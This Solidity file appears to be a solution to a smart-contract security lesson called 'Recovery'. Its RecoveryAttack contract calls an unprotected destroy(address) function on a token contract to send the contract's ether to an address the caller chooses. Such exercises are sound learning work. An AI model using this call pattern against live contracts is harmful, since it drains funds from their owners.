// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../lessons/17-Recovery.sol";

contract RecoveryAttack {
    Recovery recovery;

    constructor(address _recoveryAddress) public {
        recovery = Recovery(_recoveryAddress);
    }

    function attack(address _simpleTokenAddress, address payable _to) public {
        bytes memory data = getCalldata(_to);
        (bool success, ) = _simpleTokenAddress.call(data);
        require(success, "attack unsuccessful");
    }

    function getCalldata(address _to) public pure returns (bytes memory) {
        return abi.encodeWithSignature("destroy(address)", _to);
    }
}
